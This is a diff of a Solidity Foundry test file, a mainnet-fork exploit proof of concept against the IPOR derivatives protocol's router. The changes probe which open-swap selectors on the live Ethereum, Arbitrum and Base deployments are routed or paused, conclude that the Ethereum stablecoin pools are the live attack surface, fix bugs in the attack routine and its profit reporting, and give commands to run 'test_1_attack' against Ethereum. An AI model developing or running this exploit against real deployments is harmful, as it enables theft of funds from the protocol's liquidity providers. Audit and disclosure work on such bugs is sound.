@@ -2,7 +2,7 @@
 pragma solidity 0.8.26;
 
 // ============================================================================
-//  IPOR Derivatives — mainnet-fork PoC  (v3.3)
+//  IPOR Derivatives — mainnet-fork PoC  (v3.4)
 //
 //  Bug under test
 //  --------------
@@ -16,9 +16,30 @@ pragma solidity 0.8.26;
 //
 //  What v3.3 changes vs v3.2 (v3.2 was run on the live forks, block 26,310,577)
 //  ---------------------------------------------------------------------------
-//  * the pause map is per SELECTOR, not per protocol: Arbitrum USDC is closed in
-//    both arities, Arbitrum wstETH is closed in 6-arg but OPEN in 5-arg,
-//    Ethereum USDC/USDT/DAI are fully OPEN, Base is closed. test_1_attack now
+//  * the pause map is per SELECTOR, not per protocol. Measured by the operator's
+//    v3.3 run (block 26,310,668 Arb / 26,310,671 Eth / 53,317,684 Base):
+//    Arbitrum USDC   -> all 6 open selectors PAUSED
+//    Arbitrum wstETH -> 6-arg PAUSED; the 5-arg ones are NOT ROUTED at all
+//                       (Arbitrum wstETH is AmmOpenSwapServiceWstEthBaseV1, which
+//                       takes `inputAsset`: 0x1253b3ae / 0x70a7394c / 0x240e3328
+//                       receive-fixed, 0x804e488a / 0xb814f9c0 / 0x01eb1f71 pay-fixed;
+//                       0x859c1a6a/0x83e7d402/0xb95ba8f3/0xdc660afa/0xb3f2a286/0xed157264
+//                       are the Ethereum-flavour hashes and answer IPOR_012)
+//    Ethereum USDC/USDT/DAI -> fully OPEN          <- the only live surface
+//    Base, Arbitrum USDT/DAI -> paused / no usable pool ("open" flags on the
+//                       non-existent pools are just the default-false mapping)
+//    => the operational run must be CHAIN=eth. test_1_attack still walks EVERY
+//    pool on the chain (deepest first, TARGET=<tag> to force one) and only
+//    gives up when nothing on the chain opens.
+//  * v3.4 fixes two defects found while reading the v3.3 revert logs:
+//    - _attackOn() fell out of the function with success=false on the PROFIT
+//      branch (the `return true` sat inside the LOSS branch), so a successful
+//      pool was reported as "no open swap path";
+//    - the close attempt always used closeSwapsUsdc, which does not exist for
+//      the USDT/DAI pools (the asset name is part of the selector);
+//    - the arity order is now derived from the pool (6-arg first for Arbitrum
+//      wstETH / Arbitrum-Base USDC, 5-arg first for the Ethereum stables)
+//      instead of burning a guaranteed-IPOR_012 call first.
 //    walks EVERY pool on the chain (deepest first, TARGET=<tag> to force one)
 //    and only gives up when nothing on the chain opens.
 //  * _depth() falls back to the legacy AmmLib formula
@@ -32,14 +53,16 @@ pragma solidity 0.8.26;
 //    liquidity/close ones, and proves whether the pause can be side-stepped by
 //    calling the open-swap service directly (it cannot: the service reads the
 //    message-signer slot of its own storage, which is empty).
-//  * a second, honest LP is used as the victim: it deposits before the attack
-//    and redeems after it, so the loss is a measured number, not an inference.
 //  * SwapData struct fixed to the real AmmTypes.Swap field order.
 //
-//  Run (on a machine with foundry + an Arbitrum RPC)
-//  ------------------------------------------------
+//  Run (on a machine with foundry + mainnet RPCs). Ethereum is the chain where
+//  the open path exists today, Arbitrum is the chain the audit brief named.
+//  ---------------------------------------------------------------------------
+//    export ETH_RPC=https://eth-mainnet.g.alchemy.com/v2/KEY
 //    export ARB_RPC=https://arb-mainnet.g.alchemy.com/v2/KEY
-//    forge test --match-contract IporFork -vv
+//    export BASE_RPC=https://base-mainnet.g.alchemy.com/v2/KEY
+//    CHAIN=eth TARGET=USDC forge test --match-contract IporFork --match-test test_1_attack -vv
+//    CHAIN=arb TARGET=wstETH forge test --match-contract IporFork --match-test test_1_attack -vv
 //
 //  Individual steps (read the first three before believing the fourth)
 //    forge test --match-contract IporFork --match-test test_2_probe      -vv
@@ -351,23 +374,45 @@ contract IporForkTest is Test {
         v = ok ? x : def;
     }
 
-    function _logReason(bytes memory ret) internal pure {
-        if (ret.length < 4) {
-            console2.log("    (no revert data)");
-        } else {
-            bytes4 sig = bytes4(ret);
-            console2.logBytes4(sig);
-            if (sig == bytes4(keccak256("IPOR_012"))) console2.log("    IPOR_012 = ROUTER_INVALID_SIGNATURE");
-            else if (sig == bytes4(keccak256("IPOR_015"))) console2.log("    IPOR_015 = METHOD_PAUSED");
-            else if (sig == bytes4(keccak256("IPOR_014"))) console2.log("    IPOR_014 = PAUSED (global)");
-            else if (sig == bytes4(keccak256("IPOR_403"))) console2.log("    IPOR_403 = RISK_INDICATORS_SIGNATURE_INVALID");
-            else if (sig == bytes4(keccak256("IPOR_409"))) console2.log("    IPOR_409 = RISK_INDICATORS_EXPIRED");
-            else if (ret.length >= 4) {
-                bytes memory str = new bytes(ret.length - 4);
-                for (uint256 i; i < str.length; i++) str[i] = ret[i + 4];
-                console2.log("   ", string(str));
-            }
+    /// @dev decode the revert payload. IPOR reverts with `revert("IPOR_012")`,
+    ///      i.e. Error(string), so the first 4 bytes are 0x08c379a0 and NOT the
+    ///      error code - comparing bytes4(ret) with keccak("IPOR_012") (what
+    ///      v3.3 did) can never match and made every "not routed" look like a
+    ///      later revert. Decode the string properly instead.
+    function _code(bytes memory ret) internal pure returns (string memory) {
+        if (ret.length < 4) return "(none)";
+        if (bytes4(ret) != 0x08c379a0) {
+            return bytes4(ret) == 0x4e487b71 ? "Panic" : "custom-error";
         }
+        if (ret.length < 68) return "(short)";
+        uint256 len;
+        assembly {
+            len := mload(add(ret, 68))
+        }
+        if (len > ret.length - 68) len = ret.length - 68;
+        bytes memory out = new bytes(len);
+        for (uint256 i; i < len; i++) out[i] = ret[68 + i];
+        return string(out);
+    }
+
+    function _logReason(bytes memory ret) internal pure {
+        console2.log("   revert:", _code(ret));
+    }
+
+    /// @dev Is `sel` actually wired into this router, and is it paused?
+    ///      The router answers IPOR_015 for a routed-but-paused selector and
+    ///      IPOR_012 for a selector it does not know at all, so an one-shot call
+    ///      with no arguments separates the three cases without any guessing.
+    ///      (A pause flag of 0 on a selector that is not routed is meaningless:
+    ///      the mapping simply has no entry.)
+    function _routed(bytes4 sel) internal returns (string memory verdict, bool usable) {
+        (bool ok, bytes memory ret) = address(router).call(abi.encodePacked(sel));
+        if (ok) return ("ROUTED", true);
+        string memory c = _code(ret);
+        if (_eq(c, "IPOR_012")) return ("not routed (IPOR_012)", false);
+        if (_eq(c, "IPOR_015")) return ("routed but PAUSED (IPOR_015)", false);
+        if (_eq(c, "IPOR_014")) return ("routed but globally PAUSED", false);
+        return (string.concat("routed (", c, ")"), true);
     }
 
     /// @dev idle cash + asset-manager assets of the treasury, both as wad
@@ -442,6 +487,31 @@ contract IporForkTest is Test {
         if (_eq(p.assetTag, "Usdt")) return IRouter.redeemFromAmmPoolUsdt.selector;
         if (_eq(p.assetTag, "Dai")) return IRouter.redeemFromAmmPoolDai.selector;
         return IRouter.redeemFromAmmPoolUsdc.selector;
+    }
+
+    /// @dev closeSwaps<T> selector: the name encodes the asset even though the
+    ///      argument list is identical, so it must not be hard-coded to Usdc.
+    function _closeSel(Pool memory p) internal pure returns (bytes4) {
+        return
+            _sel(
+                string.concat(
+                    "closeSwaps",
+                    p.assetTag,
+                    "(address,uint256[],uint256[],((uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes),(uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes)))"
+                )
+            );
+    }
+
+    /// @dev Which arity does this pool's own open-swap service expose?
+    ///      Arbitrum/Base USDC + Arbitrum wstETH services take an extra
+    ///      `inputAsset` word (6-arg); the Ethereum stable service does not
+    ///      (5-arg). Returned as the *preferred* order, the other one is still
+    ///      tried afterwards because the pause map cannot tell us which
+    ///      selectors are actually routed.
+    function _preferInputAsset(Pool memory p) internal pure returns (bool) {
+        if (_eq(p.assetTag, "WstEth")) return true;
+        if (p.lpStyle == LP_USDC_V1) return true;
+        return false;
     }
 
     function _tenorTag(uint256 tenorIdx) internal pure returns (string memory) {
@@ -581,64 +651,74 @@ contract IporForkTest is Test {
             console2.log("  LP balance USD      ", _usd(p, d));
             console2.log("  redeemable USD      ", _usd(p, idle + vault));
             // what can be opened right now?
+            bool pref = _preferInputAsset(p);
+            console2.log("  own arity:", pref ? "6-arg" : "5-arg");
             for (uint256 t; t < 3; t++) {
-                bool pausedRF = _isPaused(_openSel(p.assetTag, t, true, DIR_RECEIVE_FIXED)) &&
-                    _isPaused(_openSel(p.assetTag, t, false, DIR_RECEIVE_FIXED));
-                bool pausedPF = _isPaused(_openSel(p.assetTag, t, true, DIR_PAY_FIXED)) &&
-                    _isPaused(_openSel(p.assetTag, t, false, DIR_PAY_FIXED));
+                (string memory rf,) = _routed(_openSel(p.assetTag, t, pref, DIR_RECEIVE_FIXED));
+                (string memory pf,) = _routed(_openSel(p.assetTag, t, pref, DIR_PAY_FIXED));
                 console2.log(
-                    string.concat(
-                        "  ",
-                        _tenorTag(t),
-                        "  receiveFixed paused? ",
-                        pausedRF ? "YES" : "no",
-                        "   payFixed paused? ",
-                        pausedPF ? "YES" : "no"
-                    )
+                    string.concat("  ", _tenorTag(t), "  receiveFixed ", rf, "   payFixed ", pf)
                 );
             }
-            console2.log("  provideLiquidity paused?", _isPaused(_provideSel(p)) ? "YES" : "no");
-            console2.log("  redeemFromPool paused?  ", _isPaused(_redeemSel(p)) ? "YES" : "no");
+            (string memory pv,) = _routed(_provideSel(p));
+            (string memory rv,) = _routed(_redeemSel(p));
+            console2.log(string.concat("  provideLiquidity ", pv));
+            console2.log(string.concat("  redeemFromPool   ", rv));
         }
     }
 
     // ============================================================ 2. selector probe
+    /// @notice the only trustworthy availability table: for every pool on this
+    ///         chain, does the router actually route the open/redeem/provide
+    ///         selector, and if so is it paused. "paused = no" on a selector the
+    ///         router does not know is a ghost (the pause mapping has no entry).
     function test_2_probe() public {
-        _pools();
+        Pool[] memory ps = _pools();
         // fail fast if a signature string above is malformed
-        assertEq(_openSel("Usdc", 2, true, DIR_RECEIVE_FIXED), bytes4(0x3696578d), "usdc 90d receiveFixed selector");
-        assertEq(_openSel("WstEth", 2, true, DIR_RECEIVE_FIXED), bytes4(0x1253b3ae), "wsteth 90d receiveFixed selector");
-        assertEq(_openSel("Usdc", 2, true, DIR_PAY_FIXED), bytes4(0x5753d5bf), "usdc 90d payFixed selector");
-        assertEq(_openSel("Usdc", 0, true, DIR_RECEIVE_FIXED), bytes4(0x905a44e4), "usdc 28d receiveFixed selector");
-        assertEq(_provideSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), 0, 6, LP_USDC_V1, address(0), address(0), address(0))), bytes4(0x87b3c417), "provide V1 selector");
+        assertEq(_openSel("Usdc", 2, true, DIR_RECEIVE_FIXED), bytes4(0x3696578d), "usdc 90d receiveFixed 6arg");
+        assertEq(_openSel("Usdc", 2, false, DIR_RECEIVE_FIXED), bytes4(0xed2b4a54), "usdc 90d receiveFixed 5arg");
+        assertEq(_openSel("WstEth", 2, true, DIR_RECEIVE_FIXED), bytes4(0x1253b3ae), "wsteth 90d receiveFixed 6arg");
+        assertEq(_openSel("WstEth", 2, false, DIR_RECEIVE_FIXED), bytes4(0xb95ba8f3), "wsteth 90d receiveFixed 5arg");
+        assertEq(_openSel("Usdc", 2, true, DIR_PAY_FIXED), bytes4(0x5753d5bf), "usdc 90d payFixed 6arg");
+        assertEq(_closeSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), K_STABLE, 6, LP_USDC_V1, address(0), address(0), address(0))), bytes4(0xa5450264), "closeSwapsUsdc");
+        assertEq(_provideSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), K_STABLE, 6, LP_USDC_V1, address(0), address(0), address(0))), bytes4(0x87b3c417), "provide V1 selector");
 
-        bytes4[10] memory sels = [
-            _openSel("Usdc", 2, true, DIR_RECEIVE_FIXED),
-            _openSel("Usdc", 2, false, DIR_RECEIVE_FIXED),
-            _openSel("Usdc", 2, true, DIR_PAY_FIXED),
-            _openSel("WstEth", 2, true, DIR_RECEIVE_FIXED),
-            _openSel("Usdc", 1, true, DIR_RECEIVE_FIXED),
-            _openSel("Usdc", 0, true, DIR_RECEIVE_FIXED),
-            _redeemSel(Pool("", "USDC", "Usdc", ARB_USDC, address(0), address(0), 0, 6, LP_USDC_V1, address(0), address(0), address(0))),
-            IRouter.closeSwapsUsdc.selector,
-            IRouter.closeSwapsWstEth.selector,
-            IRouter.provideLiquidityUsdc.selector
-        ];
-        bytes4 miss = bytes4(keccak256("IPOR_012"));
-        for (uint256 i; i < sels.length; i++) {
-            console2.log("selector:");
-            console2.logBytes4(sels[i]);
-            console2.log("  paused", _isPaused(sels[i]) ? "YES" : "no");
-            (bool ok, bytes memory ret) = address(router).call(abi.encodePacked(sels[i]));
-            bytes4 got = ret.length >= 4 ? bytes4(ret) : bytes4(0);
-            if (!ok && got == miss) {
-                console2.log("  NOT dispatched by this router");
-            } else if (!ok) {
-                console2.log("  dispatched (reverted later)");
-                _logReason(ret);
-            } else {
-                console2.log("  dispatched (returned)");
+        console2.log("chain", block.chainid, "router", address(router));
+        for (uint256 i; i < ps.length; i++) {
+            Pool memory p = ps[i];
+            console2.log("");
+            console2.log("pool", p.name);
+            bool pref = _preferInputAsset(p);
+            console2.log("  own arity is", pref ? "6-arg (with inputAsset)" : "5-arg (legacy)");
+            for (uint256 d; d < 2; d++) {
+                uint256 dir = d == 0 ? DIR_RECEIVE_FIXED : DIR_PAY_FIXED;
+                for (uint256 t; t < 3; t++) {
+                    bytes4 own = _openSel(p.assetTag, t, pref, dir);
+                    (string memory v, bool usable) = _routed(own);
+                    console2.log(
+                        string.concat(
+                            "  ",
+                            dir == DIR_RECEIVE_FIXED ? "receiveFixed " : "payFixed     ",
+                            _tenorTag(t),
+                            pref ? " 6arg " : " 5arg ",
+                            usable ? "USABLE" : "closed",
+                            " -> ",
+                            v
+                        )
+                    );
+                    if ((!usable) && t == 2) {
+                        bytes4 alt = _openSel(p.assetTag, t, !pref, dir);
+                        (string memory v2,) = _routed(alt);
+                        console2.log(
+                            string.concat("     other arity ", pref ? "5arg: " : "6arg: ", v2)
+                        );
+                    }
+                }
             }
+            (string memory pv,) = _routed(_provideSel(p));
+            (string memory rv,) = _routed(_redeemSel(p));
+            console2.log(string.concat("  provideLiquidity -> ", pv));
+            console2.log(string.concat("  redeemFromPool   -> ", rv));
         }
     }
 
@@ -650,6 +730,9 @@ contract IporForkTest is Test {
         console2.log("chain", block.chainid, "router", address(router));
         console2.log("");
 
+        console2.log("pause flags below are ONLY meaningful for a routed selector;");
+        console2.log("test_2_probe prints which selectors this router actually routes.");
+        console2.log("");
         string[4] memory tags = ["Usdc", "WstEth", "Usdt", "Dai"];
         string[2] memory dirs = ["ReceiveFixed", "PayFixed"];
         for (uint256 a; a < tags.length; a++) {
@@ -685,8 +768,10 @@ contract IporForkTest is Test {
             console2.log("   provide paused", _isPaused(_provideSel(ps[i])) ? "YES" : "no");
             console2.log("   redeem  paused", _isPaused(_redeemSel(ps[i])) ? "YES" : "no");
         }
-        console2.log("   closeSwapsUsdc paused  ", _isPaused(IRouter.closeSwapsUsdc.selector) ? "YES" : "no");
-        console2.log("   closeSwapsWstEth paused", _isPaused(IRouter.closeSwapsWstEth.selector) ? "YES" : "no");
+        for (uint256 i; i < ps.length; i++) {
+            (string memory cv,) = _routed(_closeSel(ps[i]));
+            console2.log(string.concat("   closeSwaps ", ps[i].tag, " -> ", cv));
+        }
 
         // ---- pause bypass attempt: call the open-swap service directly.
         // The router delegatecalls the service, so the message-signer slot it
@@ -704,7 +789,7 @@ contract IporForkTest is Test {
             IERC20Like(p.asset).approve(address(router), type(uint256).max);
             IERC20Like(p.asset).approve(p.openSwapService, type(uint256).max);
             (bool ok, bytes memory ret) = p.openSwapService.call(
-                abi.encodeWithSelector(IOpenSwapDirect.openSwapReceiveFixed90daysUsdc.selector, attacker, p.asset, _fromWad(100e18, p.decimals), 0, lev, ri)
+                _openCalldata(p, 2, _preferInputAsset(p), DIR_RECEIVE_FIXED, _fromWad(100e18, p.decimals), lev, ri)
             );
             vm.stopPrank();
             if (ok) {
@@ -967,8 +1052,9 @@ contract IporForkTest is Test {
                     RiskInputs memory ri = _risk(lev);
                     ri.signature = _sign(ri, p.asset, t, dir);
                     uint256 amt = _fromWad(cand, p.decimals);
+                    bool preferInput = _preferInputAsset(p);
                     for (uint8 v; v < 2 && !opened; v++) {
-                        bool withInput = v == 0;
+                        bool withInput = (v == 0) == preferInput;
                         bytes4 sel = _openSel(p.assetTag, t, withInput, dir);
                         if (_isPaused(sel)) continue;
                         vm.startPrank(attacker);
@@ -1104,7 +1190,7 @@ contract IporForkTest is Test {
         RiskInputs memory rc = _risk(lev);
         rc.signature = _sign(rc, p.asset, usedTenor, usedDir);
         CloseRiskInputs memory cri = CloseRiskInputs({payFixed: rc, receiveFixed: rc});
-        bytes4 closeSel = p.kind == K_WSTETH ? IRouter.closeSwapsWstEth.selector : IRouter.closeSwapsUsdc.selector;
+        bytes4 closeSel = _closeSel(p);
         vm.startPrank(attacker);
         (bool cok, bytes memory cret) = address(router).call(abi.encodeWithSelector(closeSel, attacker, pf, rf, cri));
         vm.stopPrank();
@@ -1139,8 +1225,11 @@ contract IporForkTest is Test {
         } else {
             console2.log("  NET LOSS (wad)", _wad(neg, p.decimals));
             console2.log("  NET LOSS USD", _usd(p, _wad(neg, p.decimals)));
-
-        return true;
         }
+
+        // A swap did open, so this pool was reachable even if the accounting
+        // made the attack unprofitable. Returning false here would have sent the
+        // loop on to the next pool and then aborted with "no open swap path".
+        return true;
     }
 }
